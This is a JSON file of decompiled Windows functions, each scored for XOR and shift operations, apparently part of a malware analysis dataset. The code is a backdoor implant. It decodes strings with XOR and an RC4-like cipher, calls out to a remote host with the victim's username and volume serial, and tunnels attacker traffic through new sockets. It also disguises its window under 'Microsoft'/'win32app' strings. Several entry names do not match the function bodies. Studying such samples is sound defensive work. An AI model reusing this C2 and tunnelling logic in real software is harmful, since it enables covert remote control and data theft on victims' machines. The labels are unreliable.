[
    {
        "Function": "if",
        "Total XOR and shift operations": 2,
        "XOR operations": 2,
        "Shift operations": 0,
        "Operation percentage": "3.03%",
        "Function Body": "\nvoid __fastcall __spoils<ecx> sub_401E03(int a1, _BYTE *a2, int *a3, unsigned int a4, _BYTE *a5)\n{\n  int *v5; // esi\n  int *v6; // edi\n  int v7; // ecx\n  int v8; // ebx\n  char v9; // al\n\n  if ( a3 < dword_404000 || a3 > &dword_404078 || dword_404078 == 1685221240 && dword_40407C == 6386785 )\n  {\n    if ( a5 )\n    {\n      if ( !a4 || a4 == -1 )\n        a4 = sub_401EFB(a3) + 1;\n      sub_401D65(a3, a5, a4);\n    }\n  }\n  else\n  {\n    v5 = &dword_404078;\n    v6 = dword_404000;\n    v7 = a4;\n    if ( !a4 )\n      v7 = sub_401EFB(a3) + 1;\nLABEL_13:\n    v8 = 40;\n    while ( 1 )\n    {\n      v9 = *(_BYTE *)v5;\n      v5 = (int *)((char *)v5 + 1);\n      if ( a3 <= v6 )\n      {\n        if ( a5 )\n        {\n          a2 = a5;\n          *a5 = v9;\n          *a5++ ^= *(_BYTE *)v6;\n        }\n        else\n        {\n          *(_BYTE *)v6 ^= v9;\n        }\n        --v7;\n        if ( a4 == -2 && (!a5 && !*(_WORD *)((char *)v6 - 1) || a5 && !*(_WORD *)(a2 - 1)) )\n          break;\n        if ( a4 == -1 && (!a5 && !*(_BYTE *)v6 || a5 && !*a2) )\n          break;\n      }\n      v6 = (int *)((char *)v6 + 1);\n      if ( !v7 )\n        break;\n      if ( !--v8 )\n      {\n        v5 = &dword_404078;\n        goto LABEL_13;\n      }\n    }\n  }\n}\n// 401EBF: variable 'a2' is possibly undefined\n// 404000: using guessed type int dword_404000[4];\n// 404078: using guessed type int dword_404078;\n// 40407C: using guessed type int dword_40407C;\n\n"
    },
    {
        "Function": "sub_401DEC",
        "Total XOR and shift operations": 1,
        "XOR operations": 1,
        "Shift operations": 0,
        "Operation percentage": "1.43%",
        "Function Body": "\nvoid __stdcall __spoils<ecx> sub_401926(int a1, int a2, _BYTE *a3, int a4)\n{\n  int v4; // ecx\n  int v5; // ecx\n  int v6; // esi\n  char v7; // dl\n  int v8; // eax\n  int v9; // eax\n  int v10; // ebx\n  int v11; // ebx\n  int v12; // eax\n  _BYTE *v13; // esi\n  int v14; // edi\n  char v15; // dl\n  char v17[1024]; // [esp+4h] [ebp-400h] BYREF\n\n  sub_401DEC(v17, 0x400u);\n  v8 = -66052;\n  v5 = 64;\n  do\n  {\n    *(_DWORD *)&v17[4 * v5 - 4] = v8;\n    v8 -= 67372036;\n    --v5;\n  }\n  while ( v5 );\n  v12 = 0;\nLABEL_14:\n  v11 = 0;\n  v6 = a2;\n  while ( 1 )\n  {\n    v7 = v17[v5];\n    LOBYTE(v12) = v7 + *(_BYTE *)(v11 + a1) + v12;\n    v17[v5] = v17[v12];\n    v17[v12] = v7;\n    LOBYTE(v5) = v5 + 1;\n    if ( !(_BYTE)v5 )\n      break;\n    LOBYTE(v11) = v11 + 1;\n    if ( !--v6 )\n      goto LABEL_14;\n  }\n  v14 = a4;\n  v13 = a3;\n  if ( a4 )\n  {\n    v9 = 0;\n    v4 = 0;\n    v10 = 0;\n    do\n    {\n      LOBYTE(v10) = v10 + 1;\n      v15 = v17[v10];\n      LOBYTE(v9) = v15 + v9;\n      LOBYTE(v4) = v17[v9];\n      v17[v10] = v4;\n      v17[v9] = v15;\n      LOBYTE(v4) = v15 + v4;\n      *v13++ ^= v17[v4];\n      --v14;\n    }\n    while ( v14 );\n    memset(v17, 0, 0x100u);\n  }\n}\n// 401926: using guessed type char var_400[1024];\n\n"
    },
    {
        "Function": "start",
        "Total XOR and shift operations": 0,
        "XOR operations": 0,
        "Shift operations": 0,
        "Operation percentage": "0.00%",
        "Function Body": "\nvoid __noreturn start()\n{\n  dword_4040C9 = (int)GetModuleHandleA(0);\n  dword_4040C5 = (int)GetCommandLineA();\n  sub_401031(dword_4040C9, 0, dword_4040C5, 10);\n}\n// 401000: using guessed type void __noreturn start();\n// 4040C5: using guessed type int dword_4040C5;\n// 4040C9: using guessed type int dword_4040C9;\n\n"
    },
    {
        "Function": "sub_40102B",
        "Total XOR and shift operations": 0,
        "XOR operations": 0,
        "Shift operations": 0,
        "Operation percentage": "0.00%",
        "Function Body": "\nvoid __usercall __noreturn sub_40102B(UINT a1@<eax>)\n{\n  ExitProcess(a1);\n}\n\n"
    },
    {
        "Function": "sub_401031",
        "Total XOR and shift operations": 0,
        "XOR operations": 0,
        "Shift operations": 0,
        "Operation percentage": "0.00%",
        "Function Body": "\nvoid __stdcall __noreturn sub_401031(int a1, int a2, int a3, int a4)\n{\n  char v4[1024]; // [esp+0h] [ebp-400h] BYREF\n  char vars0; // [esp+400h] [ebp+0h] BYREF\n\n  sub_401DEC(v4, &vars0 - v4);\n  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, sub_401BD2, 0, 0);\n  sub_401F92();\n}\n// 401F92: using guessed type void __noreturn sub_401F92(void);\n\n"
    },
    {
        "Function": "sub_40106C",
        "Total XOR and shift operations": 0,
        "XOR operations": 0,
        "Shift operations": 0,
        "Operation percentage": "0.00%",
        "Function Body": "\nDWORD __stdcall sub_40106C(char *lpThreadParameter)\n{\n  int v1; // ecx\n  int v2; // eax\n  SOCKET *v3; // esi\n  int v4; // ebx\n  int v5; // edi\n  char *v6; // edi\n  int v7; // eax\n  int v8; // eax\n  int v9; // ecx\n  int v10; // ecx\n  int v12; // [esp+0h] [ebp-90h] BYREF\n  DWORD cbBytesReturned; // [esp+Ch] [ebp-84h] BYREF\n  int vInBuffer[3]; // [esp+10h] [ebp-80h] BYREF\n  u_long argp; // [esp+1Ch] [ebp-74h] BYREF\n  _DWORD v16[3]; // [esp+20h] [ebp-70h] BYREF\n  struct timeval timeout; // [esp+2Ch] [ebp-64h] BYREF\n  struct sockaddr v18; // [esp+34h] [ebp-5Ch] BYREF\n  int v19; // [esp+4Ch] [ebp-44h]\n  struct sockaddr name; // [esp+50h] [ebp-40h] BYREF\n  char buf; // [esp+60h] [ebp-30h] BYREF\n  unsigned __int16 v22; // [esp+61h] [ebp-2Fh]\n  char v23; // [esp+63h] [ebp-2Dh] BYREF\n  char v24; // [esp+64h] [ebp-2Ch]\n  char v25; // [esp+65h] [ebp-2Bh]\n  char v26; // [esp+66h] [ebp-2Ah]\n  char v27; // [esp+67h] [ebp-29h]\n  char v28; // [esp+68h] [ebp-28h]\n  char v29; // [esp+69h] [ebp-27h]\n  char v30; // [esp+6Ah] [ebp-26h]\n  char v31; // [esp+6Bh] [ebp-25h]\n  char v32; // [esp+6Ch] [ebp-24h]\n  int v33; // [esp+74h] [ebp-1Ch] BYREF\n  SOCKET s; // [esp+78h] [ebp-18h]\n  HANDLE hHandle; // [esp+7Ch] [ebp-14h] BYREF\n  LPVOID lpAddress; // [esp+80h] [ebp-10h] BYREF\n  int v37; // [esp+84h] [ebp-Ch] BYREF\n  SOCKET v38; // [esp+88h] [ebp-8h]\n  SOCKET *v39; // [esp+8Ch] [ebp-4h] BYREF\n\n  sub_401DEC(&cbBytesReturned, (char *)&v37 - (char *)&v12);\n  sub_401D65(lpThreadParameter + 384, &v33, 4u);\n  sub_401D65(lpThreadParameter + 388, &v37, 4u);\n  sub_401D65(lpThreadParameter + 392, &hHandle, 4u);\n  sub_401D65(lpThreadParameter + 396, &v39, 4u);\n  sub_401D65(lpThreadParameter + 400, &lpAddress, 4u);\n  s = v39[v37];\n  v38 = *v39;\n  buf = v37;\n  v22 = 10;\n  v23 = 5;\n  v24 = 1;\n  v25 = 0;\n  v26 = 1;\n  v27 = 0;\n  v28 = 0;\n  v29 = 0;\n  v30 = 0;\n  v31 = 0;\n  v32 = 0;\n  name.sa_family = 2;\n  switch ( lpThreadParameter[7] )\n  {\n    case 3:\n      v1 = (unsigned __int8)lpThreadParameter[8];\n      *(_WORD *)name.sa_data = *(_WORD *)&lpThreadParameter[v1 + 9];\n      lpThreadParameter[v1 + 9] = 0;\n      v2 = sub_401CD9(lpThreadParameter + 9, 2);\n      if ( !v2 )\n        goto LABEL_15;\n      *(_DWORD *)&name.sa_data[2] = v2;\n      break;\n    case 1:\n      *(_DWORD *)&name.sa_data[2] = *((_DWORD *)lpThreadParameter + 2);\n      *(_WORD *)name.sa_data = *((_WORD *)lpThreadParameter + 6);\n      break;\n    case 4:\n      v18.sa_family = 23;\n      *(_DWORD *)&v18.sa_data[2] = 0;\n      v19 = 0;\n      *(_WORD *)v18.sa_data = *((_WORD *)lpThreadParameter + 12);\n      sub_401D65(lpThreadParameter + 8, &v18.sa_data[6], 0x10u);\n      break;\n    default:\n      goto LABEL_15;\n  }\n  argp = 1;\n  if ( !ioctlsocket(s, -2147195266, &argp) )\n  {\n    if ( lpThreadParameter[7] == 4 )\n      connect(s, &v18, 28);\n    else\n      connect(s, &name, 16);\n    sub_401DB2(s, 0, v16, 10, 0);\n    if ( select(0, 0, (fd_set *)v16, 0, &timeout) == 1 )\n    {\n      argp = 0;\n      ioctlsocket(s, -2147195266, &argp);\n      vInBuffer[0] = 1;\n      vInBuffer[1] = 60000;\n      vInBuffer[2] = 10000;\n      WSAIoctl(s, 0x98000004, vInBuffer, 0xCu, 0, 0, &cbBytesReturned, 0, 0);\n      v24 = 0;\n    }\n  }\nLABEL_15:\n  v3 = v39;\n  v4 = v37;\n  v5 = v22;\n  sub_401926((int)&dword_404078, 50, &buf, 3);\n  sub_401926((int)&dword_404078, 50, &v23, v5);\n  sub_401BFF(v38, &buf, v5 + 3, hHandle);\n  sub_401926((int)&dword_404078, 50, &buf, 3);\n  sub_401926((int)&dword_404078, 50, &v23, v5);\n  if ( !v24 )\n  {\n    v6 = (char *)lpAddress;\n    while ( v3[v4] )\n    {\n      sub_401DB2(s, 0, v16, 0, 100);\n      v7 = select(0, (fd_set *)v16, 0, 0, &timeout);\n      if ( v7 )\n      {\n        if ( v7 < 0 )\n          break;\n        v8 = recv(s, v6 + 3, 65530, 0);\n        if ( !v8 || v8 == -1 )\n          break;\n        *(_WORD *)(v6 + 1) = v8;\n        *v6 = v37;\n        sub_401926((int)&dword_404078, 50, v6, 3);\n        sub_401926((int)&dword_404078, 50, v6 + 3, v9);\n        sub_401BFF(v38, v6, v10 + 3, hHandle);\n      }\n    }\n  }\n  v3[v4] = 0;\n  shutdown(s, 2);\n  closesocket(s);\n  v22 = 0;\n  sub_401926((int)&dword_404078, 50, &buf, 3);\n  sub_401BFF(v38, &buf, 3, hHandle);\n  VirtualFree(lpAddress, 0, 0x8000u);\n  *(_DWORD *)(v33 + 4 * v4) = 0;\n  return 0;\n}\n// 401355: variable 'v9' is possibly undefined\n// 401360: variable 'v10' is possibly undefined\n// 404078: using guessed type int dword_404078;\n\n"
    },
    {
        "Function": "sub_4013DB",
        "Total XOR and shift operations": 0,
        "XOR operations": 0,
        "Shift operations": 0,
        "Operation percentage": "0.00%",
        "Function Body": "\nint __stdcall sub_4013DB(int *a1, u_short hostshort)\n{\n  void *v2; // eax\n  ULONG *v3; // eax\n  PULONG v4; // edi\n  _BYTE *v5; // edx\n  int v6; // ecx\n  int v7; // eax\n  PULONG v8; // edi\n  int v9; // ebx\n  int v10; // eax\n  unsigned int v11; // ecx\n  int v12; // ecx\n  int v13; // ebx\n  _DWORD *v14; // eax\n  _DWORD *v15; // esi\n  SOCKET v16; // eax\n  int v17; // eax\n  unsigned int v18; // edx\n  int v19; // edx\n  SOCKET *v20; // esi\n  int v21; // ebx\n  bool v22; // zf\n  int *v23; // edi\n  int v24; // ecx\n  int v26; // [esp+0h] [ebp-7ACh] BYREF\n  CHAR pNodeName[256]; // [esp+Ch] [ebp-7A0h] BYREF\n  int v28; // [esp+10Ch] [ebp-6A0h]\n  int v29; // [esp+110h] [ebp-69Ch]\n  DWORD cbBytesReturned; // [esp+118h] [ebp-694h] BYREF\n  int vInBuffer[3]; // [esp+11Ch] [ebp-690h] BYREF\n  char optval[4]; // [esp+128h] [ebp-684h] BYREF\n  HANDLE hObject; // [esp+12Ch] [ebp-680h] BYREF\n  int v34[200]; // [esp+130h] [ebp-67Ch] BYREF\n  SOCKET s[200]; // [esp+450h] [ebp-35Ch] BYREF\n  int v36; // [esp+770h] [ebp-3Ch]\n  int v37; // [esp+774h] [ebp-38h]\n  PULONG nSize; // [esp+778h] [ebp-34h]\n  _DWORD v39[3]; // [esp+77Ch] [ebp-30h] BYREF\n  struct timeval timeout; // [esp+788h] [ebp-24h] BYREF\n  struct sockaddr name; // [esp+790h] [ebp-1Ch] BYREF\n  char *v42; // [esp+7A0h] [ebp-Ch] BYREF\n  unsigned int v43; // [esp+7A4h] [ebp-8h]\n  LPVOID lpAddress; // [esp+7A8h] [ebp-4h] BYREF\n\n  sub_401DEC(pNodeName, (char *)&v42 - (char *)&v26);\n  v2 = VirtualAlloc(0, 0x10000u, 0x3000u, 4u);\n  if ( !v2 )\n    goto LABEL_44;\n  lpAddress = v2;\n  v3 = (ULONG *)VirtualAlloc(0, 0x10000u, 0x3000u, 4u);\n  if ( !v3 )\n    goto LABEL_44;\n  nSize = v3;\n  hObject = CreateEventA(0, 0, 1, 0);\n  v4 = nSize;\n  *nSize = 256;\n  GetUserNameExA(NameSamCompatible, (LPSTR)v4 + 82, v4);\n  s[0] = socket(2, 1, 6);\n  *(_DWORD *)optval = 1;\n  setsockopt(s[0], 6, 1, optval, 4);\n  sub_401E03(v6, v5, a1, 0xFFFFFFFF, pNodeName);\n  *(_DWORD *)&name.sa_data[2] = sub_401CD9(pNodeName, 2);\n  *(_WORD *)name.sa_data = htons(hostshort);\n  name.sa_family = 2;\n  *(_DWORD *)optval = 1;\n  ioctlsocket(s[0], -2147195266, (u_long *)optval);\n  connect(s[0], &name, 16);\n  sub_401DB2(s[0], 0, v39, 10, 0);\n  if ( select(0, 0, (fd_set *)v39, 0, &timeout) != 1 )\n    goto LABEL_44;\n  *(_DWORD *)optval = 0;\n  ioctlsocket(s[0], -2147195266, (u_long *)optval);\n  vInBuffer[0] = 1;\n  vInBuffer[1] = 600000;\n  vInBuffer[2] = 10000;\n  WSAIoctl(s[0], 0x98000004, vInBuffer, 0xCu, 0, 0, &cbBytesReturned, 0, 0);\n  sub_401D65(&dword_404078, v4 + 7, 0x32u);\n  *((_WORD *)v4 + 39) = 1;\n  *((_BYTE *)v4 + 123) = 0;\n  GetVolumeInformationA(0, 0, 0, v4 + 31, 0, 0, 0, 0);\n  sub_401926((int)&dword_404078, 50, (_BYTE *)v4 + 78, 50);\n  sub_401BFF(s[0], (char *)nSize + 28, 100, 0);\n  while ( 1 )\n  {\n    while ( 1 )\n    {\n      while ( !v43 && v36 != 4 )\n      {\n        sub_401DB2(s[0], 0, v39, 120, 0);\n        v7 = select(0, (fd_set *)v39, 0, 0, &timeout);\n        if ( v7 < 0 )\n          goto LABEL_44;\n        if ( v7 )\n          break;\n        if ( v37 || v36 )\n          goto LABEL_44;\n        v29 = 1;\n      }\n      v8 = nSize;\n      if ( v37 || v36 == 4 )\n        break;\n      if ( !v43 )\n      {\n        v17 = sub_401C86(s[0], (char *)lpAddress, 0x10000, 0);\n        if ( v17 <= 0 )\n          goto LABEL_44;\n        v29 = 1;\n        v43 = v17;\n        sub_401D65(&lpAddress, &v42, 4u);\n      }\n      v18 = 4 - v36;\n      if ( v43 < 4 - v36 )\n        v18 = v43;\n      sub_401D65(v42, (char *)v8 + v36, v18);\n      v42 += v19;\n      v43 -= v19;\n      v36 += v19;\n      if ( v36 == 4 )\n        sub_401926((int)&dword_404078, 50, v8, 4);\n    }\n    if ( !*((_WORD *)nSize + 1) )\n      break;\n    if ( !v43 )\n    {\n      v10 = sub_401C86(s[0], (char *)lpAddress, 0x10000, 0);\n      if ( v10 <= 0 )\n        goto LABEL_44;\n      v43 = v10;\n      sub_401D65(&lpAddress, &v42, 4u);\n    }\n    v11 = *((unsigned __int16 *)v8 + 1) - v37;\n    if ( v43 <= v11 )\n      v11 = v43;\n    sub_401D65(v42, (char *)v8 + v37 + 4, v11);\n    v42 += v12;\n    v43 -= v12;\n    v37 += v12;\n    if ( (_WORD)v37 == *((_WORD *)v8 + 1) )\n    {\n      sub_401926((int)&dword_404078, 50, (_BYTE *)v8 + 4, *((unsigned __int16 *)v8 + 1));\n      v13 = *((unsigned __int8 *)v8 + 1);\n      if ( *(_WORD *)v8 != 0xFFFF )\n      {\n        if ( *(_BYTE *)v8 )\n        {\n          sub_401BFF(s[v13], (char *)v8 + 4, *((unsigned __int16 *)v8 + 1), 0);\n        }\n        else\n        {\n          v14 = VirtualAlloc(0, 0x10000u, 0x3000u, 4u);\n          if ( !v14 )\n            goto LABEL_44;\n          v15 = v14;\n          sub_401D65(v8, v14, 0x180u);\n          v15[96] = v34;\n          v15[97] = v13;\n          sub_401D65(&hObject, v15 + 98, 4u);\n          v15[99] = s;\n          v15[100] = v15;\n          if ( *((_BYTE *)v15 + 7) == 4 )\n            v16 = socket(23, 1, 6);\n          else\n            v16 = socket(2, 1, 6);\n          s[v13] = v16;\n          *(_DWORD *)optval = 1;\n          setsockopt(s[v13], 6, 1, optval, 4);\n          v34[v13] = (int)CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_40106C, v15, 0, 0);\n        }\n      }\n      v37 = 0;\n    }\nLABEL_35:\n    v36 = 0;\n  }\n  if ( *(_BYTE *)nSize != 0xFF || *((_BYTE *)nSize + 1) != 0xFE )\n  {\n    v9 = *((unsigned __int8 *)nSize + 1);\n    if ( s[v9] )\n      s[v9] = 0;\n    goto LABEL_35;\n  }\n  v28 = 1;\nLABEL_44:\n  shutdown(s[0], 2);\n  closesocket(s[0]);\n  v20 = s;\n  v21 = 200;\n  do\n  {\n    *v20++ = 0;\n    --v21;\n  }\n  while ( v21 );\n  do\n  {\n    v22 = 1;\n    v23 = v34;\n    v24 = 200;\n    do\n    {\n      if ( !v24 )\n        break;\n      v22 = *v23++ == 0;\n      --v24;\n    }\n    while ( v22 );\n  }\n  while ( !v22 );\n  CloseHandle(hObject);\n  VirtualFree(lpAddress, 0, 0x8000u);\n  VirtualFree(nSize, 0, 0x8000u);\n  if ( v28 == 1 )\n    ExitProcess(0);\n  return v29;\n}\n// 40149A: variable 'v6' is possibly undefined\n// 40149A: variable 'v5' is possibly undefined\n// 4016F0: variable 'v12' is possibly undefined\n// 40187D: variable 'v19' is possibly undefined\n// 404078: using guessed type int dword_404078;\n// 4013DB: using guessed type SOCKET s[200];\n// 4013DB: using guessed type int var_67C[200];\n\n"
    },
    {
        "Function": "StartAddress",
        "Total XOR and shift operations": 0,
        "XOR operations": 0,
        "Shift operations": 0,
        "Operation percentage": "0.00%",
        "Function Body": "\nvoid __stdcall __noreturn StartAddress(LRESULT (__stdcall *lpThreadParameter)(HWND, UINT, WPARAM, LPARAM))\n{\n  _BYTE *v1; // edx\n  int v2; // ecx\n  int v3; // ecx\n  CHAR ClassName[256]; // [esp+0h] [ebp-24Ch] BYREF\n  CHAR WindowName[256]; // [esp+100h] [ebp-14Ch] BYREF\n  struct tagMSG Msg; // [esp+200h] [ebp-4Ch] BYREF\n  HWND hWnd; // [esp+21Ch] [ebp-30h]\n  WNDCLASSA WndClass; // [esp+220h] [ebp-2Ch] BYREF\n  HINSTANCE hInstance; // [esp+248h] [ebp-4h]\n  char vars0; // [esp+24Ch] [ebp+0h] BYREF\n\n  sub_401DEC(ClassName, &vars0 - ClassName);\n  sub_401E03(v2, v1, (int *)aMicrosoft, 0xAu, WindowName);\n  sub_401E03(v3, v1, (int *)aWin32app, 9u, ClassName);\n  hInstance = GetModuleHandleA(0);\n  WndClass.style = 0;\n  WndClass.lpfnWndProc = lpThreadParameter;\n  WndClass.cbClsExtra = 0;\n  WndClass.cbWndExtra = 0;\n  WndClass.hInstance = hInstance;\n  WndClass.lpszMenuName = 0;\n  WndClass.lpszClassName = ClassName;\n  WndClass.hIcon = LoadIconA(0, (LPCSTR)0x7F04);\n  WndClass.hCursor = LoadCursorA(0, (LPCSTR)0x7F01);\n  WndClass.hbrBackground = (HBRUSH)6;\n  RegisterClassA(&WndClass);\n  hWnd = CreateWindowExA(0x80u, ClassName, WindowName, 0xC80000u, 4000, 4000, 500, 150, 0, 0, hInstance, 0);\n  ShowWindow(hWnd, 1);\n  UpdateWindow(hWnd);\n  while ( 1 )\n  {\n    GetMessageA(&Msg, 0, 0, 0);\n    TranslateMessage(&Msg);\n    DispatchMessageA(&Msg);\n  }\n}\n// 401ADB: variable 'v2' is possibly undefined\n// 401ADB: variable 'v1' is possibly undefined\n// 401AEE: variable 'v3' is possibly undefined\n\n"
    },
    {
        "Function": "sub_401BD2",
        "Total XOR and shift operations": 0,
        "XOR operations": 0,
        "Shift operations": 0,
        "Operation percentage": "0.00%",
        "Function Body": "\nvoid __stdcall sub_401BD2(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)\n{\n  if ( Msg == 2 )\n    PostQuitMessage(0);\n  else\n    DefWindowProcA(hWnd, Msg, wParam, lParam);\n}\n\n"
    },
    {
        "Function": "sub_401BFF",
        "Total XOR and shift operations": 0,
        "XOR operations": 0,
        "Shift operations": 0,
        "Operation percentage": "0.00%",
        "Function Body": "\nint __stdcall sub_401BFF(SOCKET s, char *buf, int len, HANDLE hHandle)\n{\n  int v5; // eax\n  _DWORD v7[5]; // [esp+Ch] [ebp-18h] BYREF\n  int v8; // [esp+20h] [ebp-4h]\n\n  v8 = 10;\n  if ( hHandle )\n    WaitForSingleObject(hHandle, 0xFFFFFFFF);\n  do\n  {\n    if ( !len )\n      break;\n    sub_401DB2(s, 0, v7, 0, 0);\n    if ( select(0, 0, (fd_set *)v7, 0, 0) != 1 )\n      break;\n    v5 = send(s, buf, len, 0);\n    if ( v5 <= 0 )\n      break;\n    len -= v5;\n    buf += v5;\n    --v8;\n  }\n  while ( v8 );\n  if ( hHandle )\n    SetEvent(hHandle);\n  return len;\n}\n\n"
    }
]